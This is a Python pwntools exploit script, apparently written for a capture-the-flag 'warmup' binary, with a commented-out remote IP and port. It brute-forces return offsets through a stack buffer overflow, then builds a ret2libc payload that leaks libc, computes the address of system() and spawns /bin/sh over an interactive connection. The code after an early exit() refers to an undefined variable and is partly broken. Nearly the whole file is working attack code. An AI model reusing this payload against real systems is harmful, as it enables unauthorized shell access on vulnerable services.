#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from struct import pack, unpack


from multiprocessing import Pool


import os
import time
context.log_level = 'error'


def do_offset(x):
	count = 0

	conn = process('./warmup')
	# conn = remote("202.120.7.207", 52608) 
	#Welcome message
	try:
		print conn.recvuntil("\n")
	except:
		print 'eeek'
		time.sleep(4)
		pass
	payload = 'A'*(4 * 8)
	payload += str(p32(0x804815a))*1 + 'AAAA'*12 
	payload += str(p32(0x8048000 + x))
	payload += (str(p32(0x804815a)))*1000

	print hex(0x8048100 + x)

	conn.sendline(payload)


	#Ignore the buf: 'AAAAA....'
	works = True
	while works:
		try:
			print conn.recvuntil('\n')
		except:
			works = False


		count += 1

	conn.close()

	if count > 3:
		print '****************'

		print '**:' + str(x) + ":" + str(count)
	print str(x) + ":" + str(count)

	log.info(str(x) + ":" + str(count))
	# time.sleep(0.1)


# offsets = [x for x in range(0xff)]

# print offsets
	
for x in range(0xff):
	do_offset(x)



# # Create a report card for every link in the array given
# pool = Pool(processes=1)     # start worker threades for each task
# # sends each link off to it's own process
# pool.map(do_offset, offsets)
# pool.close()						  # close the pool
# pool.join()							  # wait until they are all done


exit()

# the next thing to come is the thing we printf'd which should be the address of system
printfLeak =  (str(conn.recv())).encode("hex")
backwardsAddr = printfLeak[:8]
libc = '0x' + backwardsAddr[6:]
libc += backwardsAddr[4:6]
libc += backwardsAddr[2:4]
libc += backwardsAddr[:2]


# objdump --dynamic-reloc  just putting this here :)


#This is the offset of system into libc i.e 150000 bytes
baseOfLibc = (int(libc,16) - 104816)
systemAddr 	= hex(baseOfLibc + 261328) # 261328:box    254816:local
baseOfLibc = hex(baseOfLibc)
# I did find the location of /bin/sh in libc but to simplify things I just have a slash-sled /////////////bin/sh
# binsh 		= hex((int(libc,16)) + 1325113)


# $ whoami
# nxbuf


log.info("Base at %s" % baseOfLibc)
log.info("libc starts at %s" % libc)
log.info("System is   at %s" % systemAddr)
# log.info("/bin/sh is   at %s" % binsh)


a1 = int(systemAddr, 16)
# a2 = int(binsh, 16)

payload2 =  'B'*9447
payload2 += str(p32(0x0804855c))
payload2 +=  str(p32(a1)) + 'CCCC' + str(p32(buffer_address + 9447 + 9 + 4*4 + 30 )) + '//////////////////////////////////////////////////////////////////////////////////////////////////bin/sh'

# now craft a second payload that will use the address of system
conn.sendline(payload2)

conn.interactive()



